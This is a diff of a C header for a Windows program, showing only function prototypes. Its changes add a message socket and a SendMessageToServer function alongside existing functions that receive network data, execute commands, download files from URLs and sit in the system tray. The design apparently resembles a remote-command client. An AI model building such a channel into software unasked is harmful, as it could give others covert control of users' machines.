@@ -6,16 +6,18 @@
 typedef struct {
 	HWND hOutput;
 	INT Sock;
-} THREAD_DATA;
+	INT msgSock;
+} SNOWDATA;
 
 INT_PTR CALLBACK MainWndProc(HWND hMainWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
-INT InitNetwork();
+BOOL InitNetwork(SNOWDATA *data);
 DWORD WINAPI NetThreadProc(LPVOID lParam);
-VOID ParseData(HWND hOutput, TCHAR szDataRecv[], UINT RecvSize, IN_ADDR fromAddress);
+BOOL ParseData(INT msgSock, HWND hOutput, TCHAR szDataRecv[], UINT RecvSize, IN_ADDR fromAddress);
 LPTSTR GetFilenameFromUrl(const LPTSTR szUrl);
-BOOL ExecuteCommand(HWND hOutput, const LPTSTR lpCmdLine);
+BOOL ExecuteCommand(INT msgSock, IN_ADDR ServerAddr, HWND hOutput, const LPTSTR lpCmdLine);
 BOOL DownloadFile(const LPTSTR lpCmdLine, LPTSTR szSavePath);
-VOID CleanNetwork(INT Sock);
+VOID CleanNetwork(INT Sock, INT msgSock);
 wchar_t * ANSIToUnicode(const char* str);
 char * UnicodeToANSI(const wchar_t *str);
 VOID AddTrayIcon(HWND hMainWnd, NOTIFYICONDATA *Data, UINT uSize);
+BOOL SendMessageToServer(INT msgSock, IN_ADDR Address, LPTSTR szData, ULONG iDataSize);
